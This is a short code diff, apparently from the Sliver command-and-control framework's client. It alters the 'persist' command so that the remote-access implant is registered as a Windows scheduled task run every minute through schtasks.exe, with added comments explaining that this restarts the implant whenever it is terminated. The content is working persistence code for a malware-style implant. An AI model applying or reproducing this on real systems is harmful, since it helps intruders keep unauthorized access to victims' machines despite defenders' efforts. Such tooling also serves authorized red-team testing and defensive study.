@@ -356,9 +356,12 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			}
 		} else {
 			// User persistence (schtasks)
+			// Note that windows prevents onlogon and onstart from userland
+			// By using minutely, schtasks will check the process every minute,
+			// and restart it if it has terminated.
 			resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
 				Path:    systemroot + "\\System32\\schtasks.exe",
-				Args:    []string{"/create", "/tn", sliver, "/tr", path, "/sc", "onlogon", "/u", session.Username, "/f"},
+				Args:    []string{"/create", "/tn", sliver, "/tr", path, "/sc", "minute", "/ru", session.Username, "/f"},
 				Output:  false,
 				Request: ActiveSession.Request(ctx),
 			})
